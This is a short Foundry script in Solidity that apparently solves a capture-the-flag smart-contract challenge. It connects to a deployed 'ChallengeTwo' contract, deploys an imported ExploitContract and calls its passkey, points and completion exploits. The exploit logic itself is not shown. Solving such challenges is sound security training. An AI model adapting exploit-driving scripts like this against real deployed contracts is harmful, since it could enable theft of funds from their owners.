// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/W3BCXI.sol";
import "../src/ExploitTwo.sol";
import "../src/ChallengeTwo.sol";

contract ChallengeTwoScript is Script {
    address constant CONTRACT_ADDRESS = 0x8D6B11D53A4CE78658d8335EafAa1e77A2FB101d;
    ChallengeTwo public target;
    // address payable public attacker;
    ExploitContract public exploit;
    


    function setUp() public {
        // Connect to the already deployed contract
        target = ChallengeTwo(payable(address(CONTRACT_ADDRESS))); // Replace with actual contract address
        
        // exploit = new Exploit(0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249);
        // Set up attacker account with your private key
        // uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // attacker = payable(vm.addr(privateKey));
    }

    function run() public {
        vm.startBroadcast();
        exploit = new ExploitContract(payable(CONTRACT_ADDRESS));

        exploit.exploitPassKey();
        exploit.exploitPoints();
        exploit.completeChallenge();

       
        
        vm.stopBroadcast();
    }
}